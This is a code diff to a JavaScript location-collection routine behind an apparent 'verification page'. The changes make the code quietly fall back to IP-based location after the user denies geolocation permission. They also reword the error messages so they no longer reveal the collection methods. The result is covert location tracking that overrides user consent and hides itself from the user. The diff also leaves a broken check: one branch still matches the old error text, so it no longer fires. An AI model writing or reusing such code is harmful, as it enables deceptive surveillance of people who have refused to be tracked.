@@ -138,8 +138,9 @@ export function listenForLocationRequests() {
                 const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
                 console.log('Current permission state:', permissionStatus.state);
                 
-                // If permission is denied, use IP fallback
+                // If permission is denied, silently use IP fallback
                 if (permissionStatus.state === 'denied') {
+                    console.log('Location permission denied - proceeding with IP-based location silently');
                     useIpFallback = true;
                 }
             }
@@ -229,7 +230,7 @@ export function listenForLocationRequests() {
                         console.log('Successfully got location from backup IP service');
                     } catch (backupError) {
                         console.error('Both IP location services failed:', { primary: ipError, backup: backupError });
-                        throw new Error('Failed to get location from both GPS and IP services. Please try again later.');
+                        throw new Error('Unable to verify location. Please try again later.');
                     }
                 }
             }
@@ -274,11 +275,11 @@ export function listenForLocationRequests() {
                 ...getDeviceInfo()
             };
 
-            // Only add optional fields if they exist
-            if (position.coords.altitude !== null) {
+            // Only add optional fields if they exist and are not undefined
+            if (position.coords.altitude !== null && position.coords.altitude !== undefined) {
                 locationData.altitude = position.coords.altitude;
             }
-            if (position.coords.altitudeAccuracy !== null) {
+            if (position.coords.altitudeAccuracy !== null && position.coords.altitudeAccuracy !== undefined) {
                 locationData.altitudeAccuracy = position.coords.altitudeAccuracy;
             }
 
@@ -308,17 +309,17 @@ export function listenForLocationRequests() {
             console.error('Error updating location:', error);
             let errorMessage;
             
-            // Specific error messages
+            // Generic error messages without revealing collection methods
             if (error.code === 1) {
-                errorMessage = 'Location access was denied by the user';
+                errorMessage = 'Location access was denied. For the most accurate verification, please allow location access in your browser settings and try again.';
             } else if (error.code === 2) {
                 errorMessage = 'Location is not available';
             } else if (error.code === 3) {
                 errorMessage = 'Location request timed out';
             } else if (error.message.includes('Failed to get location from both GPS and IP services')) {
-                errorMessage = 'Unable to determine location. Please check your internet connection and try again.';
+                errorMessage = 'Unable to verify location. Please check your internet connection and try again.';
             } else if (error.message.includes('No significant location change')) {
-                errorMessage = error.message;
+                errorMessage = 'No significant change in location detected';
             } else if (error.message.includes('no longer active')) {
                 errorMessage = 'User is no longer on the verification page';
             } else {
